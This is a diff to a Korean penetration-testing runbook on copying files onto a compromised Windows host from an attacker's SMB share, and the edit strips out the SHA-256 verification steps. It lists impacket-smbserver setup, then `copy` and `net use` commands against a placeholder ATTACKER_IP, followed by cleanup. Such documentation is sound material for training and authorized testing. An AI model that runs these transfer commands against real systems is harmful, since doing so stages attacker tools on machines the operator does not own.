@@ -5,27 +5,21 @@ tags:
 시작조건: ["Windows 대상 셸 확보", "Windows 대상에서 공격 호스트의 SMB 445/TCP에 연결 가능"]
 필요권한: ["Windows 대상의 저장 경로 쓰기 권한", "공격 호스트의 공유 디렉터리 읽기 권한"]
 필요조건: ["반입할 파일", "공격 호스트 SMB 주소와 공유명", "Guest 차단 시 임시 SMB 사용자명과 비밀번호"]
-결과: ["Windows 대상에 반입한 파일", "송신본과 수신본의 SHA-256 비교 결과"]
+결과: ["Windows 대상에 반입한 파일"]
 ---
 
 # SMB 공유로 Windows 파일 반입
 
 ## 한 줄 판단
 
-Windows 대상 셸에서 공격 호스트의 SMB 445/TCP에 연결할 수 있고 대상 저장 경로에 쓸 수 있으면, 공격 호스트에 SMB 공유를 열고 UNC 경로 또는 인증된 드라이브에서 파일을 복사한 뒤 양쪽 SHA-256을 비교한다.
-
-## 사용할 때
-
-- Windows 대상에 실행 파일·스크립트·설정 파일을 반입해야 할 때.
-- 대상에서 공격 호스트의 SMB 445/TCP로 연결할 수 있을 때.
-- HTTP 클라이언트보다 Windows의 `copy`·`net use`를 바로 사용할 수 있을 때.
+Windows 대상 셸에서 공격 호스트의 SMB 445/TCP에 연결할 수 있고 대상 저장 경로에 쓸 수 있으면, 공격 호스트에 SMB 공유를 열고 UNC 경로 또는 인증된 드라이브에서 파일을 복사한다.
 
 ## 전제 조건
 
 | 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
 |---|---|---|---|
 | 통신 방향 | Windows 대상에서 공격 호스트의 445/TCP 도달 | `Test-NetConnection <ATTACKER_IP> -Port 445` | 주소, route와 방화벽 확인 |
-| 송신 파일 | 공격 호스트 공유 디렉터리에 파일 존재 | `sha256sum <SOURCE_FILE>` | 공유 경로와 파일명 확인 |
+| 송신 파일 | 공격 호스트 공유 디렉터리에 파일 존재 | 공유 경로와 파일명 확인 | 경로와 파일명 확인 |
 | 대상 저장 경로 | 현재 Windows 계정으로 파일 생성 가능 | `<DESTINATION_DIRECTORY>`에 임시 파일 생성 | 디렉터리 ACL과 디스크 공간 확인 |
 | SMB 인증 | Guest 접근 허용 또는 임시 공유 계정 사용 가능 | 첫 UNC 접근 결과 | Guest 차단이면 인증 공유로 전환 |
 
@@ -37,9 +31,10 @@ Windows 대상 셸에서 공격 호스트의 SMB 445/TCP에 연결할 수 있고
 
 ```bash
 sudo ss -ltnp 'sport = :445'
-sha256sum <SHARE_DIRECTORY>/<SOURCE_FILE>
 sudo impacket-smbserver share -smb2support <SHARE_DIRECTORY>
 ```
+
+`<SHARE_DIRECTORY>`는 공격 호스트에서 `<SOURCE_FILE>`을 포함하는 디렉터리(예: `./share`)이고, `<SOURCE_FILE>`은 그 안의 파일명이다. `<DESTINATION_FILE>`은 대상 Windows의 새 절대 경로, `<ATTACKER_IP>`는 대상에서 도달할 SMB 호스트 주소다.
 
 두 번째 Linux 터미널:
 
@@ -70,7 +65,6 @@ Guest 접근이 가능한 경우:
 
 ```cmd
 copy /-Y \\<ATTACKER_IP>\share\<SOURCE_FILE> "<DESTINATION_FILE>"
-certutil -hashfile "<DESTINATION_FILE>" SHA256
 ```
 
 `You can't access this shared folder because ... block unauthenticated guest access`가 나오면 같은 명령을 반복하지 않고 인증 공유를 연결한다.
@@ -78,7 +72,6 @@ certutil -hashfile "<DESTINATION_FILE>" SHA256
 ```cmd
 net use <SMB_DRIVE>: \\<ATTACKER_IP>\share /user:<SMB_USER> <SMB_PASSWORD>
 copy /-Y <SMB_DRIVE>:\<SOURCE_FILE> "<DESTINATION_FILE>"
-certutil -hashfile "<DESTINATION_FILE>" SHA256
 net use <SMB_DRIVE>: /delete
 ```
 
@@ -86,21 +79,19 @@ net use <SMB_DRIVE>: /delete
 
 - `The command completed successfully`는 SMB 드라이브 연결 성공이다.
 - `1 file(s) copied.`와 실제 `<DESTINATION_FILE>` 생성을 함께 확인한다.
-- 공격 호스트의 원본과 Windows 대상의 SHA-256이 같아야 반입 완료다.
 
 ## 관찰과 상태 전환
 
 | 관찰 | 판단 | 결과 상태 | 다음 행동 |
 |---|---|---|---|
-| SMB 연결, 파일 생성과 SHA-256 일치 | 파일 반입 완료 | Windows 대상의 반입 파일 | 파일 실행 조건과 현재 권한을 별도 확인 |
+| SMB 연결과 파일 생성 | 파일 반입 완료 | Windows 대상의 반입 파일 | 파일 실행 조건과 현재 권한을 별도 확인 |
 | Guest 정책 차단 메시지 | 익명 SMB 공유 사용 불가 | SMB 경로는 도달하지만 인증 필요 | 임시 인증 공유와 `net use` 사용 |
 | `System error 53` 또는 연결 실패 | SMB 경로·주소·공유명 문제 | 파일 미반입 | 445/TCP, 공격 호스트 listener와 공유명 확인 |
 | `Access is denied` 또는 대상 쓰기 실패 | 공유 읽기 또는 대상 디렉터리 쓰기 권한 부족 | 파일 미반입 | 오류가 난 경로의 ACL과 현재 계정 확인 |
-| 복사됐지만 SHA-256 불일치 | 파일 손상 또는 다른 파일 복사 | 손상된 반입 파일 | 실행하지 말고 경로와 원본을 확인해 재전송 |
 
 ## 확인할 출력과 권한
 
-- SMB 드라이브 연결, 파일 복사와 무결성 확인은 서로 다른 완료 단계다.
+- SMB 드라이브 연결과 파일 복사는 서로 다른 완료 단계다.
 - 파일 반입은 실행 성공이나 권한 상승을 뜻하지 않는다.
 
 ## 변경 영향과 복구
@@ -109,7 +100,7 @@ net use <SMB_DRIVE>: /delete
 
 | 변경 대상 | 기존 상태·식별값 | 복구 절차 | 완료 확인 |
 |---|---|---|---|
-| 대상 저장 파일 | 실행 전 존재하지 않은 `<DESTINATION_FILE>`과 전송 후 SHA-256 | Windows 대상에서 `del "<DESTINATION_FILE>"` | `if exist "<DESTINATION_FILE>" echo FILE_STILL_EXISTS`가 출력되지 않음 |
+| 대상 저장 파일 | 실행 전 존재하지 않은 `<DESTINATION_FILE>` | Windows 대상에서 `del "<DESTINATION_FILE>"` | `if exist "<DESTINATION_FILE>" echo FILE_STILL_EXISTS`가 출력되지 않음 |
 | 인증 SMB drive | 실행 전 `net use`에 없던 `<SMB_DRIVE>:`와 UNC 경로 | Windows 대상에서 `net use <SMB_DRIVE>: /delete` | `net use`에 해당 drive와 UNC가 없음 |
 | SMB listener | 실행 전 445/TCP 상태, `<SMB_SERVER_PID>`와 command line | 원격 파일·mapping 정리 확인 뒤 Linux 공격 호스트에서 `sudo kill <SMB_SERVER_PID>` | `sudo ss -ltnp 'sport = :445'`에 기록한 PID가 없음 |
 
